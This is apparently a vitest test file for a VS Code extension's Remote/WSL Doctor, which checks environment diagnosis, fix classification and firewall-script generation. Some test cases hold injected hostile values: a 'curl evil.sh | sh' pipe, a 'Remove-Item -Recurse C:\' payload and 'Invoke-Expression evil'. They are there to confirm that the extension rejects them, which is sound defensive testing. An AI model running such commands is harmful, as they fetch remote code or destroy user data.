/**
 * Remote / WSL Doctor (P2 #12) — pure environment analysis + one-click fix
 * classification (gap #12). Host-free.
 */
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  analyzeRemoteEnv,
  compareVersions,
  summarizeRemoteDoctor,
} from "../../../vscode-extension/src/remote-doctor.js";
import {
  AUTO_COMMAND_ALLOWLIST,
  RESTART_BRIDGE_COMMAND,
  extractFirewallPort,
  classifyFixes,
  buildFirewallFixScript,
  buildWslConfigPatch,
} from "../../../vscode-extension/src/remote-doctor-fixes.js";

const byId = (r, id) => r.checks.find((c) => c.id === id);

describe("compareVersions", () => {
  it("compares dotted numeric versions, ignoring prerelease tails", () => {
    expect(compareVersions("0.162.156", "0.162.155")).toBe(1);
    expect(compareVersions("0.162.155", "0.162.156")).toBe(-1);
    expect(compareVersions("1.0.0", "1.0.0")).toBe(0);
    expect(compareVersions("v0.162.156", "0.162.156")).toBe(0);
    expect(compareVersions("0.162.156-alpha.1", "0.162.156")).toBe(0);
    expect(compareVersions("0.163.0", "0.162.999")).toBe(1);
  });
});

describe("analyzeRemoteEnv", () => {
  it("a clean local session with a good CLI + live bridge is all-ok", () => {
    const r = analyzeRemoteEnv({
      platform: "win32",
      cliFound: true,
      cliVersion: "0.162.156",
      minCliVersion: "0.162.150",
      bridgePort: 51234,
      portProbe: "listening",
    });
    expect(r.level).toBe("ok");
    expect(byId(r, "cli-ok")).toBeTruthy();
    expect(byId(r, "bridge-ok")).toBeTruthy();
    // no WSL advice for a local session
    expect(byId(r, "wsl-networking")).toBeUndefined();
  });

  it("flags WSL mirrored-networking when inside WSL or on a \\\\wsl UNC folder", () => {
    for (const sig of [
      { isWsl: true },
      {
        platform: "win32",
        remoteUncPath: "\\\\wsl.localhost\\Ubuntu\\home\\me\\p",
      },
    ]) {
      const r = analyzeRemoteEnv(sig);
      const wsl = byId(r, "wsl-networking");
      expect(wsl).toBeTruthy();
      expect(wsl.level).toBe("warn");
      expect(wsl.fix).toContain("networkingMode=mirrored");
    }
  });

  it("errors on a missing CLI with a remote-aware hint + install command", () => {
    const r = analyzeRemoteEnv({ isWsl: true, cliFound: false });
    const c = byId(r, "cli-missing");
    expect(r.level).toBe("error");
    expect(c.fix).toBe("npm install -g chainlesschain");
    expect(c.detail).toContain("host the IDE is running on");
  });

  it("warns when the CLI is older than the plugin expects", () => {
    const r = analyzeRemoteEnv({
      cliFound: true,
      cliVersion: "0.162.100",
      minCliVersion: "0.162.150",
    });
    const c = byId(r, "cli-outdated");
    expect(c.level).toBe("warn");
    expect(c.fix).toContain("@latest");
  });

  it("errors when the bridge is stopped and advises restart", () => {
    const r = analyzeRemoteEnv({ bridgePort: 0, portProbe: "stopped" });
    expect(byId(r, "bridge-stopped").level).toBe("error");
    expect(byId(r, "bridge-stopped").fix).toContain("Restart Bridge");
  });

  it("adds a firewall advisory only for remote sessions with an unverified port", () => {
    const remote = analyzeRemoteEnv({
      isWsl: true,
      bridgePort: 51234,
      portProbe: "unknown",
    });
    expect(byId(remote, "firewall")).toBeTruthy();
    expect(byId(remote, "firewall").fix).toContain("netsh advfirewall");
    // local session with a listening port → no firewall noise
    const local = analyzeRemoteEnv({
      bridgePort: 51234,
      portProbe: "listening",
    });
    expect(byId(local, "firewall")).toBeUndefined();
  });

  it("summary marks the overall level and renders fixes", () => {
    const r = analyzeRemoteEnv({ isWsl: true, cliFound: false });
    expect(r.summary).toContain("Remote / WSL Doctor");
    expect(r.summary).toContain("✗");
    expect(r.summary).toContain("fix:");
    expect(summarizeRemoteDoctor({ level: "ok", checks: [] }, false)).toContain(
      "All checks passed",
    );
  });
});

// ── gap #12: one-click fix classification / generation ─────────────────────

/** A realistic worst-case environment: every actionable check fires. */
const fullChecks = () =>
  analyzeRemoteEnv({
    isWsl: true,
    cliFound: true,
    cliVersion: "0.162.100",
    minCliVersion: "0.162.150",
    bridgePort: 51234,
    portProbe: "unknown",
  }).checks;

describe("classifyFixes", () => {
  it("classifies the real analyzeRemoteEnv checks into the three tiers", () => {
    const fixes = classifyFixes(fullChecks());
    const byId = Object.fromEntries(fixes.map((f) => [f.id, f]));
    expect(byId["cli-outdated"].kind).toBe("autoApplicable");
    expect(byId["cli-outdated"].action).toEqual({
      type: "terminal",
      command: "npm install -g chainlesschain@latest",
    });
    expect(byId["firewall"].kind).toBe("scriptable");
    expect(byId["firewall"].action).toEqual({ type: "script", port: 51234 });
    expect(byId["wsl-networking"].kind).toBe("manualOnly");
    expect(byId["wsl-networking"].action).toEqual({ type: "wslconfig" });
  });

  it("maps a stopped bridge to the existing restart command (no shell)", () => {
    const checks = analyzeRemoteEnv({
      bridgePort: 0,
      portProbe: "stopped",
    }).checks;
    const fix = classifyFixes(checks).find((f) => f.id === "bridge-stopped");
    expect(fix.kind).toBe("autoApplicable");
    expect(fix.action).toEqual({
      type: "vscodeCommand",
      command: RESTART_BRIDGE_COMMAND,
    });
    expect(RESTART_BRIDGE_COMMAND).toBe("chainlesschain.ide.restart");
  });

  it("maps a missing CLI to the allowlisted install command", () => {
    const checks = analyzeRemoteEnv({ cliFound: false }).checks;
    const fix = classifyFixes(checks).find((f) => f.id === "cli-missing");
    expect(fix.kind).toBe("autoApplicable");
    expect(fix.action.command).toBe("npm install -g chainlesschain");
    expect(AUTO_COMMAND_ALLOWLIST.test(fix.action.command)).toBe(true);
  });

  it("NEVER executes tampered fix text — hostile commands fall to copy-only", () => {
    const hostile = classifyFixes([
      {
        id: "cli-outdated",
        level: "warn",
        title: "t",
        fix: "npm install -g chainlesschain@latest && curl evil.sh | sh",
      },
    ]);
    expect(hostile[0].kind).toBe("manualOnly");
    expect(hostile[0].action.type).toBe("copy");
  });

  it("skips ok-level checks and checks without a fix", () => {
    const fixes = classifyFixes([
      { id: "cli-ok", level: "ok", title: "fine", fix: "noop" },
      { id: "bridge-ok", level: "ok", title: "fine" },
      { id: "mystery", level: "warn", title: "?" }, // no fix → nothing to offer
    ]);
    expect(fixes).toEqual([]);
  });

  it("unknown check ids with a fix degrade to copy-only", () => {
    const fixes = classifyFixes([
      { id: "future-check", level: "warn", title: "t", fix: "do the thing" },
    ]);
    expect(fixes[0]).toMatchObject({
      kind: "manualOnly",
      action: { type: "copy", text: "do the thing" },
    });
  });
});

describe("extractFirewallPort", () => {
  it("extracts only a digits-validated in-range port", () => {
    expect(extractFirewallPort({ fix: "… localport=51234" })).toBe(51234);
    expect(extractFirewallPort({ fix: "localport=0" })).toBeNull();
    expect(extractFirewallPort({ fix: "localport=99999" })).toBeNull();
    expect(extractFirewallPort({ fix: "no port here" })).toBeNull();
    expect(extractFirewallPort(null)).toBeNull();
  });
});

describe("buildFirewallFixScript", () => {
  it("generates an elevation-checked, idempotent netsh script", () => {
    const script = buildFirewallFixScript(fullChecks());
    const lines = script.split("\r\n");
    // Elevation check MUST be the first line for PowerShell to honor it.
    expect(lines[0]).toBe("#Requires -RunAsAdministrator");
    // Comment header explains what it does.
    expect(script).toContain("ChainlessChain Remote / WSL Doctor");
    expect(script).toContain("inbound Windows Firewall ALLOW rule");
    // Pure ASCII: UTF-8-no-BOM + PowerShell 5.1 would mojibake anything else.
    expect(/^[\x00-\x7F]*$/.test(script)).toBe(true);
    // The actual rule add + idempotency guard.
    expect(script).toContain(
      'netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow protocol=TCP localport=$port',
    );
    expect(script).toContain("netsh advfirewall firewall show rule");
    expect(script).toContain("already exists - skipping");
    expect(script).toContain("$ports = @(51234)");
  });

  it("is deterministic and returns null with no firewall check", () => {
    expect(buildFirewallFixScript(fullChecks())).toBe(
      buildFirewallFixScript(fullChecks()),
    );
    expect(buildFirewallFixScript([])).toBeNull();
    expect(
      buildFirewallFixScript(analyzeRemoteEnv({ cliFound: false }).checks),
    ).toBeNull();
  });

  it("embeds nothing from hostile check text — only validated digits", () => {
    const script = buildFirewallFixScript([
      {
        id: "firewall",
        level: "warn",
        title: 'x"; Remove-Item -Recurse C:\\ #',
        detail: "$(evil)",
        fix: 'netsh … localport=51234 "; Invoke-Expression evil #',
      },
    ]);
    expect(script).toContain("@(51234)");
    expect(script).not.toContain("Remove-Item");
    expect(script).not.toContain("Invoke-Expression");
    expect(script).not.toContain("$(evil)");
    // A firewall check whose port cannot be digits-validated produces nothing.
    expect(
      buildFirewallFixScript([
        { id: "firewall", level: "warn", title: "t", fix: "localport=evil" },
      ]),
    ).toBeNull();
  });

  it("dedupes ports across multiple firewall checks", () => {
    const script = buildFirewallFixScript([
      { id: "firewall", level: "warn", title: "a", fix: "localport=1234" },
      { id: "firewall", level: "warn", title: "b", fix: "localport=1234" },
      { id: "firewall", level: "warn", title: "c", fix: "localport=5678" },
    ]);
    expect(script).toContain("@(1234, 5678)");
  });
});

describe("buildWslConfigPatch", () => {
  it("returns the exact ini + target path + post step", () => {
    const patch = buildWslConfigPatch(fullChecks());
    expect(patch).toMatchObject({
      targetPathHint: "%UserProfile%\\.wslconfig",
      ini: "[wsl2]\nnetworkingMode=mirrored\n",
      postStep: "wsl --shutdown",
    });
    expect(patch.note).toContain("Merge");
  });

  it("returns null when no wsl-networking check is present", () => {
    expect(buildWslConfigPatch([])).toBeNull();
    expect(
      buildWslConfigPatch(analyzeRemoteEnv({ cliFound: false }).checks),
    ).toBeNull();
  });
});

describe("remote doctor fix glue wiring", () => {
  const extSrc = readFileSync(
    fileURLToPath(
      new URL("../../../vscode-extension/src/extension.js", import.meta.url),
    ),
    "utf-8",
  );

  it("runRemoteDoctor offers the fix flow from the pure module", () => {
    expect(extSrc).toContain('require("./remote-doctor-fixes.js")');
    expect(extSrc).toContain("offerRemoteDoctorFixes");
    expect(extSrc).toContain("classifyFixes(report.checks)");
    expect(extSrc).toContain("buildFirewallFixScript");
    expect(extSrc).toContain("buildWslConfigPatch");
    // Safe fixes require one explicit confirm before anything runs.
    expect(extSrc).toContain("Apply ${autos.length} safe fix(es)?");
    expect(extSrc).toContain("showSaveDialog");
  });

  it("the extension never runs netsh/admin commands itself", () => {
    // The only netsh text in extension.js may be display copy — assert the
    // fix flow routes firewall changes through the generated script only.
    const fixSection = extSrc.slice(extSrc.indexOf("offerRemoteDoctorFixes"));
    expect(fixSection).not.toMatch(/sendText\([^)]*netsh/);
    expect(fixSection).not.toMatch(/exec[^(]*\([^)]*netsh/);
  });
});
